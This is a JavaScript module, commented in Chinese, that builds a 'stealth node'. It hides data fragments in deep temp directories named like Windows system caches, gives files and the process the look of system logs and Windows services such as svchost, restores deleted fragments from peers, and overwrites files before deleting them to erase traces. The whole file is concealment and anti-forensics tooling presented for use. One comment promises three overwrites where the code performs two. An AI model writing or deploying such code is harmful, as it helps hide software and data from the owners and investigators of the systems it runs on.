// stealth-node.js
// v2: 隐身节点。伪装成系统进程，数据存储在缓存/临时目录中。

const fs = require("fs")
const path = require("path")
const os = require("os")
const crypto = require("crypto")

// ============================================
// 伪装层
// ============================================

// 进程名称伪装 —— 使用常见系统服务名
const DISGUISE_NAMES = [
  "svchost", "fontdrvhost", "dwm", "sihost",
  "TaskHost", "RuntimeBroker", "ctfmon"
]

// 存储位置：使用系统临时目录或缓存目录
function _stealthStore() {
  // 优先使用 TEMP 或 TMP 环境变量
  const base = process.env.TEMP || process.env.TMP || os.tmpdir()
  // 隐藏在深层子目录中，名字像系统缓存
  const depth = 3 + Math.floor(Math.random() * 2)
  let dir = base
  const segments = [
    "Microsoft", "Windows", "Caches", "Temporary", "AppData",
    "LocalLow", "FontCache", "IconCache", "CorruptionDetection"
  ]
  for (let i = 0; i < depth; i++) {
    dir = path.join(dir, segments[i % segments.length])
    if (!fs.existsSync(dir)) {
      try { fs.mkdirSync(dir, { recursive: true }) } catch(e) { break }
    }
  }
  return dir
}

// 文件命名伪装：像系统日志/缓存文件
function _disguiseFilename(fragmentId) {
  const prefix = ["~$", ".", "tmp", "cache_"][Math.floor(Math.random() * 4)]
  const ext = [".tmp", ".log", ".dat", ".etl", ".bin", ".idx"][Math.floor(Math.random() * 6)]
  const hash = crypto.createHash("md5").update(fragmentId).digest("hex").slice(0, 8)
  return `${prefix}${hash}${ext}`
}

// ============================================
// 逻辑尘埃存储与传播
// ============================================

class StealthNode {
  constructor(nodeId, fragments) {
    this.nodeId = nodeId
    this.alive = true
    this.store = _stealthStore()
    this.disguisedName = DISGUISE_NAMES[Math.floor(Math.random() * DISGUISE_NAMES.length)]

    // 写入碎片到隐蔽位置
    this._fragmentFiles = []
    fragments.forEach((frag, i) => {
      if (frag) {
        const filename = _disguiseFilename(frag._tag || `${nodeId}_${i}`)
        const filepath = path.join(this.store, filename)
        try {
          fs.writeFileSync(filepath, JSON.stringify({
            _meta: { ver: 2, ts: Date.now(), origin: nodeId },
            ...frag
          }))
          this._fragmentFiles.push(filepath)
        } catch(e) { /* 静默失败 */ }
      }
    })

    console.log(`[${this.disguisedName}:${process.pid}] 静默 | 碎片: ${fragments.length} | 位置: ${this.store.slice(0,40)}...`)
  }

  // 读取存储的碎片
  readFragments() {
    return this._fragmentFiles
      .map(fp => {
        try {
          const raw = fs.readFileSync(fp, "utf-8")
          return JSON.parse(raw)
        } catch(e) { return null }
      })
      .filter(Boolean)
  }

  // 自愈：如果某个碎片丢失，从网络中的其他节点复制
  healFrom(peerFragments) {
    if (!this.alive) return 0
    let restored = 0
    const existing = this.readFragments()
    const existTags = new Set(existing.map(f => f._tag))

    peerFragments.forEach(pf => {
      if (!existTags.has(pf._tag)) {
        const filename = _disguiseFilename(pf._tag)
        const filepath = path.join(this.store, filename)
        try {
          fs.writeFileSync(filepath, JSON.stringify(pf))
          this._fragmentFiles.push(filepath)
          restored++
        } catch(e) {}
      }
    })
    return restored
  }

  // 溶解：覆写后删除
  dissolve() {
    if (!this.alive) return
    this.alive = false
    this._fragmentFiles.forEach(fp => {
      try {
        // 覆写三次再删除
        fs.writeFileSync(fp, crypto.randomBytes(256).toString("hex"))
        fs.writeFileSync(fp, "0".repeat(512))
        fs.unlinkSync(fp)
      } catch(e) {}
    })
    this._fragmentFiles = []
    console.log(`[${this.disguisedName}:${process.pid}] 已溶解`)
  }

  stats() {
    return {
      pid: process.pid,
      disguise: this.disguisedName,
      fragments: this._fragmentFiles.length,
      store: this.store
    }
  }
}

module.exports = { StealthNode }
